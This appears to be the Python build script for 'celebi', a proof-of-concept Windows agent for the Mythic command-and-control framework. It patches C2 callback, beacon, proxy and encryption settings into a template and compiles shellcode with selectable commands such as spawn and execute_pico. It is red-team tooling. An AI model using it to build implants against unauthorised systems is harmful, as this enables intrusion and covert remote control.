from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *

import base64
import os
import subprocess
from urllib.parse import urlsplit

class CelebiAgent(PayloadType):
	name = "celebi"
	file_extension = "bin"
	agent_type = AgentType.Agent
	author = "@ofasgard"
	mythic_encrypts = False
	supported_os = [
		SupportedOS.Windows
	]
	semver = "0.1.9"
	note = "A PoC agent that uses Crystal Palace to build its payload."
	supports_dynamic_loading = True
	supports_multiple_c2_instances_in_build = False
	supports_multiple_c2_in_build = False
	build_parameters = [
	BuildParameter(name="debug", parameter_type=BuildParameterType.Boolean, default_value=False, description="Enable dprintf() debugging."),
	BuildParameter(name="exit_func", parameter_type=BuildParameterType.ChooseOne, choices=["process", "thread"], default_value="process", description="Use ExitProcess() or ExitThread() to exit.")
	]
	build_steps = []
	c2_profiles = ["http", "smb", "tcp"]
	c2_parameter_deviations = {}
	translation_container = "celebi_translator"
	agent_path = pathlib.Path(".")
	agent_code_path = agent_path / "celebi_agent"
	agent_icon_path = agent_path / "icon.svg"

	async def build(self) -> BuildResponse:
		# This function gets called to create an instance of your payload.
		self.configure_pic()
		
		parameters = {
			"debug": self.get_parameter("debug"),
			"exit_func": self.get_parameter("exit_func")
		}
		# Feature selection: Mythic sends the operator's checked commands here
		# (supports_dynamic_loading). Anything not selected is compiled out of
		# the shellcode via -DCELEBI_NO_<CMD>.
		parameters["commands"] = self.commands.get_commands() if self.commands else []
		self.build_pic(parameters)
		
		resp = BuildResponse(status=BuildStatus.Success)
		resp.payload = open("/Mythic/celebi_pic/out/main.bin", "rb").read()
		# v4: report build metadata so Mythic can evaluate payload/wrapper compatibility.
		resp.build_metadata = PayloadBuildMetadata(
			architecture=PayloadBuildMetadataArchitecture.X64,
			format=PayloadBuildMetadataFormat.Shellcode,
		)
		
		return resp
	
	def configure_pic(self):
		config = open("/Mythic/templates/config.spec", "r").read()
		c2params = self.c2info[0].get_parameters_dict()
		
		# Patch in the payload UUID.
		config = config.replace("### PAYLOAD_UUID ###", self.uuid)
		
		# Patch in the C2 server host (http profiles only; smb/tcp leave it blank).
		cb_host = str(c2params.get("callback_host", ""))
		hostname = ""
		if cb_host:
			parsed_url = urlsplit(cb_host)
			hostname = parsed_url.hostname
		config = config.replace("### CALLBACK_HOST ###", hostname or "")
		
		# Patch in the C2 server port.
		config = config.replace("### CALLBACK_PORT ###", str(c2params.get("callback_port", 80)))
		
		## Patch in the C2 server HTTPS toggle.
		if cb_host and "https" in cb_host.lower():
				config = config.replace("### CALLBACK_HTTPS ###", "1")
		else:
				config = config.replace("### CALLBACK_HTTPS ###", "0")
		
		# Patch in the C2 server URIs.
		config = config.replace("### POST_URI ###", str(c2params.get("post_uri", "data")))
		config = config.replace("### GET_URI ###", str(c2params.get("get_uri", "")))
		config = config.replace("### QUERY_PATH_NAME ###", str(c2params.get("query_path_name", "q")))
		
		# Patch in beacon timing.
		config = config.replace("### CALLBACK_INTERVAL ###", str(c2params.get("callback_interval", 5)))
		config = config.replace("### CALLBACK_JITTER ###", str(c2params.get("callback_jitter", 0)))
		
		# Patch in the killdate. Accepts YYYY-MM-DD or a number of days from today.
		killdate = c2params.get("killdate", "")
		killdate_str = ""
		if killdate is not None and str(killdate) != "":
			kd = str(killdate)
			if kd.isdigit():
				from datetime import datetime, timedelta
				killdate_str = (datetime.now() + timedelta(days=int(kd))).strftime("%Y-%m-%d")
			else:
				killdate_str = kd
		config = config.replace("### KILLDATE ###", killdate_str)
		
		# Patch in the HTTP headers dictionary ("Name: value\r\n" format).
		headers = c2params.get("headers", {})
		headers_str = ""
		if headers is not None:
			if isinstance(headers, dict):
				# Join with escaped CRLF so the line-based config.spec stays valid;
				# the agent unescapes them at runtime.
				headers_str = "\\r\\n".join("{}: {}".format(k, v) for k, v in headers.items() if v)
			else:
				headers_str = str(headers)
		config = config.replace("### HEADERS ###", headers_str)
		
		# Patch in the proxy configuration.
		config = config.replace("### PROXY_HOST ###", str(c2params.get("proxy_host", "")))
		proxy_port = c2params.get("proxy_port", "") or "0"
		config = config.replace("### PROXY_PORT ###", str(proxy_port))
		config = config.replace("### PROXY_USER ###", str(c2params.get("proxy_user", "")))
		config = config.replace("### PROXY_PASS ###", str(c2params.get("proxy_pass", "")))
		
		# Patch in the crypto type + key. crypto_type params arrive as a dict:
		# {"value": "aes256_hmac"|"none", "enc_key": <base64>, "dec_key": <base64>}
		aespsk = c2params.get("AESPSK", "none")
		aes_value = "none"
		aes_key = ""
		if isinstance(aespsk, dict):
			aes_value = aespsk.get("value", "none")
			ek = aespsk.get("enc_key")
			if ek is not None:
				# enc_key arrives as raw bytes (or as a base64 string over JSON).
				aes_key = base64.b64encode(ek).decode() if isinstance(ek, bytes) else str(ek)
		elif aespsk is not None:
			aes_value = str(aespsk)
		config = config.replace("### AES_VALUE ###", aes_value)
		config = config.replace("### AES_KEY ###", aes_key)
		
		# Patch in the encrypted exchange check flag.
		eke = str(c2params.get("encrypted_exchange_check", False)).lower()
		config = config.replace("### ENCRYPTED_EXCHANGE_CHECK ###", "true" if eke in ("true", "1") else "false")
		
		# Patch in the p2p settings. smb/tcp profiles make this a p2p child that
		# binds a server; http profiles leave p2p disabled.
		profile_name = ""
		if len(self.c2info) > 0:
			profile_name = str(self.c2info[0].get_c2profile().get("name", ""))
		if profile_name in ("smb", "tcp"):
			pipename = str(c2params.get("pipename", ""))
			port = str(c2params.get("port", "")) or "0"
		else:
			pipename = ""
			port = "0"
		config = config.replace("### PIPENAME ###", pipename)
		config = config.replace("### P2P_PROFILE ###", profile_name if profile_name in ("smb", "tcp") else "none")
		config = config.replace("### P2P_PORT ###", port)
		
		fd = open("/Mythic/celebi_pic/config.spec", "w")
		fd.write(config)
		fd.close()
	
	def build_pic(self, parameters):
		proc = subprocess.Popen(["make", "clean"], cwd="/Mythic/celebi_pic/")
		proc.wait()

		cflags = []
		if parameters["debug"] == True:
			cflags.append("-DCELEBI_DEBUG")
		if parameters["exit_func"] == "thread":
			cflags.append("-DCELEBI_EXIT_THREAD")

		# Compile out commands the operator didn't select. Default (empty list
		# or a bare build) keeps every command.
		all_commands = [
			"exit", "sleep", "whoami", "register", "unregister", "execute_pico",
			"morph", "link", "unlink", "spawn", "spawnto",
			"ls", "ps", "cat", "pwd", "change", "cd",
		]
		selected = set(parameters.get("commands") or [])
		if len(selected) > 0:
			for cmd in all_commands:
				if cmd not in selected:
					cflags.append("-DCELEBI_NO_{}".format(cmd.upper()))

		# Pass CFLAGS through the environment: a single argv element like
		# CFLAGS="-DA -DB" makes make treat it as one -D argument and swallow
		# every define after the first, silently compiling excluded commands
		# back in. The environment avoids any shell quoting ambiguity.
		env = dict(os.environ)
		if len(cflags) > 0:
			env["CFLAGS"] = " ".join(cflags)

		proc = subprocess.Popen(["make", "pic"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env, cwd="/Mythic/celebi_pic/")
		proc.wait()
		
# 0.0.x = initial PoC, non-functional
# 0.1.x = pre-alpha, functional but incomplete
# 0.2.x = alpha, mostly complete, no expectation of stability
# 0.3.x = beta, feature complete, stable but needs testing
# 1.0.0 = stable
